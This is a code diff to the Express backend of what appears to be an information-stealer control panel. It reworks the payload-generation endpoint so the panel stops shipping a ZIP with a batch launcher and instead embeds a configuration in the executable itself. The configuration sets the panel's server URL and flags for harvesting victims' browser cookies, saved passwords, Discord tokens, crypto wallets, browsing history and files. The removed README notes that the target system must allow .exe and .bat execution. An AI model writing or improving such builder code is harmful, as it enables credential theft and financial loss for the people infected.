@@ -682,11 +682,14 @@ app.post('/api/logs/delete', authenticateToken, (req, res) => {
     }
 });
 
-// Payload generation endpoint
+// Magic marker that the exe looks for to find embedded config
+const CONFIG_MARKER = '<<<PAYLOAD_CONFIG_START>>>';
+
+// Payload generation endpoint - creates a standalone exe with embedded config
 app.post('/api/payloads/generate', authenticateToken, (req, res) => {
     try {
         const username = req.user.username;
-        const { features, user } = req.body;
+        const { features, user, outputName } = req.body;
 
         if (!features || typeof features !== 'object') {
             return res.status(400).json({ message: 'features object is required' });
@@ -711,81 +714,48 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
         console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
         console.log(`Selected features:`, features);
 
-        // Create a ZIP archive containing the payload and configuration
-        const archiver = require('archiver');
-        const archive = archiver('zip', {
-            zlib: { level: 9 }
+        // Read the original exe file
+        const exeBuffer = fs.readFileSync(payloadPath);
+
+        // Create the configuration JSON that will be appended
+        const configJson = JSON.stringify({
+            user: username,
+            serverUrl: serverUrl,
+            collectLocation: features.location || false,
+            collectSystemInfo: features.systemInfo || false,
+            collectRunningProcesses: features.runningProcesses || false,
+            collectInstalledApps: features.installedApps || false,
+            collectBrowserCookies: features.browserCookies || false,
+            collectSavedPasswords: features.savedPasswords || false,
+            collectBrowserHistory: features.browserHistory || false,
+            collectDiscordTokens: features.discordTokens || false,
+            collectCryptoWallets: features.cryptoWallets || false,
+            collectImportantFiles: features.importantFiles || false
         });
 
-        // Set response headers
-        res.setHeader('Content-Type', 'application/zip');
-        res.setHeader('Content-Disposition', `attachment; filename="payload_${username}_${Date.now()}.zip"`);
+        // Create buffer with marker + config
+        const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
+        const configBuffer = Buffer.from(configJson, 'utf-8');
 
-        // Handle archive errors
-        archive.on('error', (err) => {
-            console.error('Archive error:', err);
-            if (!res.headersSent) {
-                res.status(500).json({ message: 'Error creating payload archive', error: err.message });
-            }
-        });
+        // Combine exe + marker + config
+        const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);
 
-        // Pipe archive data to response
-        archive.pipe(res);
+        // Sanitize output filename (remove invalid chars, ensure .exe extension)
+        let filename = outputName || `payload_${username}_${Date.now()}`;
+        filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
+        if (!filename.toLowerCase().endsWith('.exe')) {
+            filename += '.exe';
+        }
 
-        // Add the executable
-        archive.file(payloadPath, { name: 'payload.exe' });
+        // Set response headers for exe download
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+        res.setHeader('Content-Length', finalBuffer.length);
 
-        // Create environment configuration batch file
-        const envConfig = [
-            '@echo off',
-            `set CLIENT_USER=${username}`,
-            `set WEBPANEL_URL=${serverUrl}`,
-            `set COLLECT_LOCATION=${features.location ? '1' : '0'}`,
-            `set COLLECT_SYSTEM_INFO=${features.systemInfo ? '1' : '0'}`,
-            `set COLLECT_RUNNING_PROCESSES=${features.runningProcesses ? '1' : '0'}`,
-            `set COLLECT_INSTALLED_APPS=${features.installedApps ? '1' : '0'}`,
-            `set COLLECT_BROWSER_COOKIES=${features.browserCookies ? '1' : '0'}`,
-            `set COLLECT_SAVED_PASSWORDS=${features.savedPasswords ? '1' : '0'}`,
-            `set COLLECT_BROWSER_HISTORY=${features.browserHistory ? '1' : '0'}`,
-            `set COLLECT_DISCORD_TOKENS=${features.discordTokens ? '1' : '0'}`,
-            `set COLLECT_CRYPTO_WALLETS=${features.cryptoWallets ? '1' : '0'}`,
-            `set COLLECT_IMPORTANT_FILES=${features.importantFiles ? '1' : '0'}`,
-            '',
-            'echo Starting payload with configuration...',
-            'payload.exe',
-            '',
-            'pause'
-        ].join('\r\n');
+        console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);
 
-        archive.append(envConfig, { name: 'run_payload.bat' });
-
-        // Create a README file with instructions
-        const readme = [
-            'Payload Configuration',
-            '====================',
-            '',
-            `Generated for user: ${username}`,
-            `Server URL: ${serverUrl}`,
-            `Generated at: ${new Date().toISOString()}`,
-            '',
-            'Features enabled:',
-            ...Object.entries(features).map(([key, enabled]) =>
-                `  - ${key}: ${enabled ? 'YES' : 'NO'}`
-            ),
-            '',
-            'To run the payload:',
-            '1. Extract all files to the same directory',
-            '2. Double-click run_payload.bat',
-            '',
-            'The batch file will set the correct environment variables and run the payload.',
-            '',
-            'Note: Make sure the target system allows execution of .exe and .bat files.'
-        ].join('\r\n');
-
-        archive.append(readme, { name: 'README.txt' });
-
-        // Finalize the archive
-        archive.finalize();
+        // Send the patched exe
+        res.send(finalBuffer);
 
     } catch (error) {
         console.error('Error generating payload:', error);
